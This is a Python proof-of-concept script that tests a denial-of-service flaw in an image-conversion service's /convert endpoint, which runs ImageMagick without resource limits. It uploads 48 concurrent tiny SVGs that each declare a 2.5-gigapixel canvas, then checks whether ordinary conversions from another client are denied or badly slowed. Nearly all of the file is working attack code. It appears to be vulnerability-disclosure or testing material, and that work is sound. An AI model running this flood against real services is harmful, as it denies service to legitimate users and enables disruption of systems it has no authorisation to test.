#!/usr/bin/env python3
"""
PoC #3: Decompression-bomb / pixel-flood DoS
--------------------------------------------
ImageMagickService.convert() runs `magick` with no -limit (area / memory / disk
/ width / height) and no policy.xml, so a tiny input that declares an enormous
canvas forces ImageMagick (via its SVG delegate) to grind on a gigapixel raster.
Each such request pins a whole CPU inside a magick/inkscape subprocess tree and
holds it for the full 60s magick timeout. Root cause: missing resource limits.

CONFIRMATION IS BY LIVENESS OF A SEPARATE VICTIM, NOT BY THE BOMB REQUEST'S OWN
FATE. The old PoC sent ONE bomb and declared success because that request itself
was slow (">8s") or errored — but a single slow/failed request only proves the
attacker hurt themselves, not that the service was denied to anyone else. Under
the module's real deployment envelope (see the fleet: cpus=1.0, mem_limit=1g,
pids_limit=100) a lone bomb just pins the one CPU for its own 60s while the JVM
keeps serving everyone else.

Note also that GET /health is the WRONG victim probe here: it is a trivial
handler that the scheduler always finds a slice for, so it keeps answering "ok"
in ~0ms even while every CPU is pegged. The resource the bomb actually starves
is the useful work — an ImageMagick conversion. So the victim we watch is a
NORMAL /convert from a separate client: we baseline it, then fire a barrage of
gigapixel conversions that between them saturate the 1-CPU budget and push the
process tree toward the 100-pid ceiling, and probe the victim /convert again.
The DoS is confirmed only if that normal conversion (which a moment earlier
finished in ~1s) is now denied — it times out, 5xx's, or its latency has
collapsed by a large factor. If the victim keeps converting normally, the flood
hurt only the attacker's own requests and this is reported as NOT a full DoS.

WARNING: this genuinely saturates the target for the duration of the barrage —
run it against a throwaway instance.

Run IPM first, then:  python3 03_decompression_bomb.py [host] [port]
"""
import statistics
import sys
import threading
import time
import urllib.error
import urllib.request
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
BASE = f"http://{HOST}:{PORT}"

# A tiny SVG declaring a ~2.5-gigapixel canvas. Rendering it is pure CPU/time
# with no cap, so each one occupies a magick/inkscape subprocess tree for the
# full server-side 60s magick timeout.
BOMB_SVG = (
    '<?xml version="1.0"?>'
    '<svg xmlns="http://www.w3.org/2000/svg" width="50000" height="50000">'
    '<rect width="50000" height="50000" fill="red"/></svg>'
).encode()
# A trivially-cheap SVG — this is the legitimate VICTIM request whose fate
# decides the test. On an idle service it converts in ~1s.
SMALL_SVG = (
    '<?xml version="1.0"?>'
    '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
    '<rect width="10" height="10" fill="green"/></svg>'
).encode()

# How many bombs to fire at once. Needs to comfortably out-number the CPU budget
# and crowd the pid ceiling so a fresh conversion can't get a look-in.
N_BOMBS = 48
# Victim /convert client timeout. On an idle service the victim returns in ~1s;
# if it can't finish within this window while the flood runs, that IS the denial.
# Kept tight and hardware-independent: a denied conversion never *completes*, so
# we only need to wait long enough to tell "denied" from a healthy ~1-3s render,
# NOT for the bomb's own 60s server-side timeout. See the concurrent probe below.
VICTIM_TIMEOUT = 8
# Bomb client timeout: we never wait on the bombs' own outcome (daemon threads,
# never joined), so this only bounds leaked sockets — not the test's wall clock.
BOMB_TIMEOUT = 30
# Victim probes taken during the flood, and how many must be "denied" to confirm.
# The probes run CONCURRENTLY (a real DoS denies them all at once), so 3 probes
# cost ONE VICTIM_TIMEOUT window, not three — the old sequential loop spent up to
# VICTIM_PROBES * VICTIM_TIMEOUT (~60s) here and blew the per-PoC budget. Two of
# three must be denied so a single transient blip can't false-positive.
VICTIM_PROBES = 3
VICTIM_CONFIRM = 2
# A victim conversion is "degraded" if it is this many times slower than the
# idle baseline (with a floor, so a fast baseline can't set a hair-trigger).
DEGRADE_FACTOR = 8
DEGRADE_FLOOR_S = 5.0


def convert(svg_bytes, filename, timeout):
    """POST an SVG to /convert. Returns (ok, latency, detail). ok=True only if
    it returned 2xx within `timeout`."""
    boundary = "----ipmPoC" + uuid.uuid4().hex
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="image"; filename="{filename}"\r\n'
            f"Content-Type: image/svg+xml\r\n\r\n").encode()
    body += svg_bytes + b"\r\n" + f"--{boundary}--\r\n".encode()
    req = urllib.request.Request(f"{BASE}/convert", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    start = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            r.read()
            return True, time.time() - start, f"{r.status}"
    except urllib.error.HTTPError as e:
        return False, time.time() - start, f"HTTP {e.code}"
    except Exception as e:
        return False, time.time() - start, type(e).__name__


def fire_bomb():
    try:
        convert(BOMB_SVG, "bomb.svg", BOMB_TIMEOUT)
    except Exception:
        pass


def main():
    # 0) Baseline: the victim conversion must work before we can claim we denied
    #    it. Two samples so a single warm-up hiccup doesn't skew the threshold.
    samples = []
    for _ in range(2):
        ok, lat, detail = convert(SMALL_SVG, "victim.svg", VICTIM_TIMEOUT)
        if not ok:
            print(f"[!] Pre-check: a normal /convert failed ({detail}, {lat:.1f}s); "
                  "is IPM (and its FMM) up? Cannot run a DoS test against an "
                  "already-unhealthy service.")
            sys.exit(2)
        samples.append(lat)
    baseline = statistics.median(samples)
    threshold = max(DEGRADE_FLOOR_S, baseline * DEGRADE_FACTOR)
    print(f"[*] Baseline: a normal /convert returns in ~{baseline:.1f}s "
          f"(denial threshold for this run: >{threshold:.1f}s or an error)")

    # 1) Fire the barrage of gigapixel conversions. Fire-and-forget: we do NOT
    #    wait on their outcome, we watch the victim.
    print(f"[*] Firing {N_BOMBS} concurrent {len(BOMB_SVG)}-byte SVGs, each "
          "declaring a 50000x50000 (~2.5 gigapixel) canvas...")
    for _ in range(N_BOMBS):
        threading.Thread(target=fire_bomb, daemon=True).start()
    time.sleep(2)  # let the flood ramp and grab the CPU/pids

    # 2) Victim watch: are NORMAL conversions from separate clients denied? Fire
    #    all VICTIM_PROBES at once and wait a single VICTIM_TIMEOUT window — a
    #    real saturation DoS denies them simultaneously, so there's no reason to
    #    pay for them sequentially.
    results = [None] * VICTIM_PROBES

    def probe(idx):
        results[idx] = convert(SMALL_SVG, "victim.svg", VICTIM_TIMEOUT)

    threads = [threading.Thread(target=probe, args=(i,), daemon=True)
               for i in range(VICTIM_PROBES)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(VICTIM_TIMEOUT + 2)

    denied = 0
    for i in range(VICTIM_PROBES):
        res = results[i]
        if res is None:  # thread still stuck past its own client timeout == denied
            denied += 1
            print(f"[*]   victim /convert #{i+1}: DENIED (no return within window)")
            continue
        ok, lat, detail = res
        if not ok:
            denied += 1
            print(f"[*]   victim /convert #{i+1}: DENIED ({detail} after {lat:.1f}s)")
        elif lat > threshold:
            denied += 1
            print(f"[*]   victim /convert #{i+1}: DEGRADED ({lat:.1f}s, "
                  f">{threshold:.1f}s threshold)")
        else:
            print(f"[*]   victim /convert #{i+1}: still healthy ({lat:.1f}s)")

    # 3) Verdict. A trivial /health would have kept answering "ok" throughout —
    #    the point is that the service's actual work is denied to other callers.
    if denied >= VICTIM_CONFIRM:
        print(f"[+] Pixel-flood DoS confirmed — {denied}/{VICTIM_PROBES} legitimate "
              f"/convert requests from a separate client were denied/degraded "
              f"(baseline ~{baseline:.1f}s) while the gigapixel barrage saturated "
              "the CPU/pid budget. No -limit / policy.xml capped the render, so a "
              "few hundred bytes each starves every other caller's conversions.")
        return
    print(f"[-] Only {denied}/{VICTIM_PROBES} victim probes were denied; normal "
          "/convert kept working. The huge canvas may have been rejected, the SVG "
          "renderer may be unavailable, or the host has enough CPU/pid headroom to "
          "absorb the flood — not a full DoS here.")
    sys.exit(1)


if __name__ == "__main__":
    main()
